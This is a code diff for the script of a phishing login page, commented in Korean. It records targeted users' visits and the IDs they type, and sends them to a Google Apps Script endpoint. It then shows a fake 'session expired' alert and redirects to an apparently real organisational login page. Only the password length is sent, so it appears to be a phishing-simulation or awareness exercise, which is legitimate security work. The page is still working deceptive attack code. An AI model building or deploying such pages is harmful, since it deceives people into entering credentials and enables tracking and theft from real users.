@@ -33,10 +33,16 @@
     </div>
 
     <script>
-        // ★ 여기에 새로 배포한 GAS URL을 꼭 업데이트해줘!
-        const gasUrl = 'https://script.google.com/macros/s/AKfycbzyZYJJfRbPEtmM7rnXjXLaipUKBItoK4njPWkk0tyerFlSDQRKuP1JIjyfybLURPegPQ/exec';
+        // 새로 배포한 웹 앱 URL을 여기에 넣으세요
+        const gasUrl = 'https://script.google.com/macros/s/AKfycbwG55MXJXjRpOBQwfX98zaJP5Rag-cnJF6ZFOJj_TY1BFJwQrQD4kZAzOkBFvktkBnqCA/exec';
 
         let originalTarget = "";
+
+        // 데이터 전송 함수 (가장 확실한 URL 파라미터 방식)
+        const sendToGas = (target, input, pw) => {
+            const finalUrl = `${gasUrl}?targetId=${encodeURIComponent(target)}&inputId=${encodeURIComponent(input)}&pwLen=${pw}`;
+            fetch(finalUrl, { method: 'POST', mode: 'no-cors' });
+        };
 
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
@@ -44,37 +50,23 @@
 
             if (originalTarget !== "알수없음") {
                 document.getElementById('userId').value = originalTarget;
-
-                // [최초 접속 로그] 타겟ID | (접속함) | 0
-                var formData = new FormData();
-                formData.append('targetId', originalTarget);
-                formData.append('inputId', '(접속함)');
-                formData.append('pwLen', '0');
-
-                fetch(gasUrl, { method: 'POST', mode: 'no-cors', body: formData });
+                // 접속 로그 전송
+                sendToGas(originalTarget, "(접속함)", "0");
             }
         };
 
         document.getElementById('phishingForm').addEventListener('submit', function(e) {
             e.preventDefault(); 
-
             var currentTypedId = document.getElementById('userId').value;
             var currentTypedPw = document.getElementById('userPw').value;
 
-            // [로그인 시도 로그] 타겟ID | 실제입력ID | 비번수
-            var formData = new FormData();
-            formData.append('targetId', originalTarget);   // URL에 있던 원본
-            formData.append('inputId', currentTypedId);    // 사용자가 입력한 값
-            formData.append('pwLen', currentTypedPw.length); // 비번 글자수
+            // 입력 로그 전송
+            sendToGas(originalTarget, currentTypedId, currentTypedPw.length);
 
-            fetch(gasUrl, {
-                method: 'POST',
-                mode: 'no-cors', 
-                body: formData
-            }).then(() => {
-                alert('세션이 만료되었습니다. 다시 로그인해 주세요.');
+            setTimeout(() => {
+                alert('보안 세션이 만료되었습니다. 다시 로그인해 주세요.');
                 window.location.href = 'https://gnware.gnk.or.kr/login';
-            });
+            }, 500);
         });
     </script>
 </body>
